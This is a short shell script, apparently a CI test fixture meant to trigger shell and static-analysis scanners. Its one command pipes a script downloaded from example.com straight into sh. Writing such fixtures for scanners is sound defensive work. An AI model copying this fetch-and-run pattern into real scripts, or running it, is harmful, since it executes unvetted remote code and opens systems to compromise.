#!/usr/bin/env sh
# CI fixture: remote pipe-to-shell pattern (shell / SAST scanners).
set -eu
curl -fsSL http://example.com/ci-fixture-install.sh | sh
